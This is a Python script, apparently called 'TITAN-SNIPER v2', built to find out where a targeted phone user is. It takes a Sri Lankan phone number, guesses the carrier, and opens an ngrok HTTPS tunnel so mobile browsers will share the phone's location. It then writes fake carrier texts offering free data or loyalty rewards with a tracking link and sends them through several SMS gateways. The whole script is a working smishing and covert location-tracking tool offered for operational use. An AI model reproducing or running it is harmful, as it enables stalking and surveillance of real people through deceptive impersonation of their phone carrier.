#!/usr/bin/env python3
"""
TITAN-SNIPER v2: Real-World Op Ready Location Grabber
- Uses pyngrok to get a valid HTTPS URL (mandatory: mobile browsers block HTTP geolocation)
- Multi-gateway SMS dispatch: Vonage -> ClickSend -> smsto -> manual fallback
"""
import requests
import sys
import os

VONAGE_API_KEY     = os.getenv("VONAGE_API_KEY", "")
VONAGE_API_SECRET  = os.getenv("VONAGE_API_SECRET", "")
CLICKSEND_USER     = os.getenv("CLICKSEND_USER", "")
CLICKSEND_API_KEY  = os.getenv("CLICKSEND_API_KEY", "")
SMSTO_API_KEY      = os.getenv("SMSTO_API_KEY", "")
NGROK_TOKEN        = os.getenv("NGROK_TOKEN", "")
SERVER_PORT        = int(os.getenv("DI_MAIN_PORT", "8001"))


def get_ngrok_url():
    # 1. Check if ngrok tunnel already running
    try:
        resp = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=3)
        for t in resp.json().get("tunnels", []):
            if t.get("proto") == "https":
                print(f"[+] Reusing active ngrok tunnel: {t['public_url']}")
                return t["public_url"]
    except Exception:
        pass
    # 2. Launch via pyngrok
    try:
        from pyngrok import ngrok, conf
        if NGROK_TOKEN:
            conf.get_default().auth_token = NGROK_TOKEN
        tunnel = ngrok.connect(SERVER_PORT, "http")
        print(f"[+] ngrok tunnel launched: {tunnel.public_url}")
        return tunnel.public_url
    except Exception as e:
        print(f"[-] ngrok unavailable: {e}")
    # 3. Raw VPS IP fallback
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
        url = f"http://{ip}:{SERVER_PORT}"
        print(f"[!] WARNING: Using HTTP {url} — mobile browser may block geolocation. Set NGROK_TOKEN for HTTPS.")
        return url
    except Exception:
        return f"http://127.0.0.1:{SERVER_PORT}"


def get_carrier(msisdn):
    n = msisdn.lstrip("+").lstrip("0")
    if not n.startswith("94"):
        n = "94" + n
    dialog_p  = ["9477","9476","9475","9474","9473","9472"]
    mobitel_p = ["9471","9470"]
    hutch_p   = ["9478"]
    for p in dialog_p:
        if n.startswith(p): return "Dialog", n
    for p in mobitel_p:
        if n.startswith(p): return "Mobitel", n
    for p in hutch_p:
        if n.startswith(p): return "Hutch", n
    return "Telecom", n


def craft_sms(carrier, url):
    t = {
        "Dialog":  f"Dialog: Your 5GB Free Data Pack is ready. Tap to activate before midnight: {url}",
        "Mobitel": f"Mobitel: Uncollected loyalty reward expires today! Claim now: {url}",
        "Hutch":   f"Hutch: Monthly data rollover pending. Confirm your number: {url}",
    }
    return t.get(carrier, f"Network Alert: Account verification required. Visit: {url}")


def dispatch_vonage(num, msg):
    if not (VONAGE_API_KEY and VONAGE_API_SECRET): return False
    try:
        r = requests.post("https://rest.nexmo.com/sms/json", data={
            "api_key": VONAGE_API_KEY, "api_secret": VONAGE_API_SECRET,
            "from": "Alert", "to": num, "text": msg
        }, timeout=10).json()
        if str(r.get("messages",[{}])[0].get("status","99")) == "0":
            print(f"[+] Vonage: SENT ({r['messages'][0].get('message-id')})")
            return True
        print(f"[-] Vonage: {r['messages'][0].get('error-text')}")
    except Exception as e:
        print(f"[-] Vonage: {e}")
    return False


def dispatch_clicksend(num, msg):
    if not (CLICKSEND_USER and CLICKSEND_API_KEY): return False
    try:
        r = requests.post("https://rest.clicksend.com/v3/sms/send",
            json={"messages":[{"source":"OP","from":"Alert","body":msg,"to":f"+{num}"}]},
            auth=(CLICKSEND_USER, CLICKSEND_API_KEY), timeout=10).json()
        if r.get("response_code") == "SUCCESS":
            print("[+] ClickSend: SENT")
            return True
        print(f"[-] ClickSend: {r.get('response_msg')}")
    except Exception as e:
        print(f"[-] ClickSend: {e}")
    return False


def dispatch_smsto(num, msg):
    if not SMSTO_API_KEY: return False
    try:
        r = requests.post("https://api.sms.to/sms/send",
            json={"to": f"+{num}", "message": msg, "sender_id": "Alert"},
            headers={"Authorization": f"Bearer {SMSTO_API_KEY}"}, timeout=10).json()
        if r.get("success"):
            print("[+] sms.to: SENT")
            return True
        print(f"[-] sms.to: {r}")
    except Exception as e:
        print(f"[-] sms.to: {e}")
    return False


def generate_sniper_sms(msisdn):
    print(f"\n{'='*58}")
    print(f"  TITAN-SNIPER v2 — REAL WORLD OP MODE")
    print(f"{'='*58}")
    carrier, num_intl = get_carrier(msisdn)
    base = get_ngrok_url()
    track_id = num_intl[-4:]
    url = f"{base}/verify/{track_id}"
    sms = craft_sms(carrier, url)
    print(f"\n  Target   : +{num_intl} ({carrier})")
    print(f"  Track ID : {track_id}")
    print(f"  Track URL: {url}")
    print(f"  SMS Body : {sms}\n")

    sent = False
    print("[*] SMS dispatch chain...")
    sent = sent or dispatch_vonage(num_intl, sms)
    sent = sent or dispatch_clicksend(num_intl, sms)
    sent = sent or dispatch_smsto(num_intl, sms)

    if not sent:
        print("\n[!] No SMS gateway keys configured. Send manually:")
        print(f"    {sms}")
        print("\n    Configure via env vars:")
        print("      VONAGE_API_KEY + VONAGE_API_SECRET")
        print("      CLICKSEND_USER + CLICKSEND_API_KEY")
        print("      SMSTO_API_KEY")

    print(f"\n[*] Ensure server is running: python3 server.py")
    print(f"[*] Watch terminal for: [!!!] MISSION ACCOMPLISHED: LOCATION ACQUIRED")
    print(f"{'='*58}\n")
    return {"url": url, "sms": sms, "carrier": carrier, "dispatched": sent}


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python loc_sniper.py <MSISDN>  [e.g. 0763549876]")
        sys.exit(1)
    generate_sniper_sms(sys.argv[1])
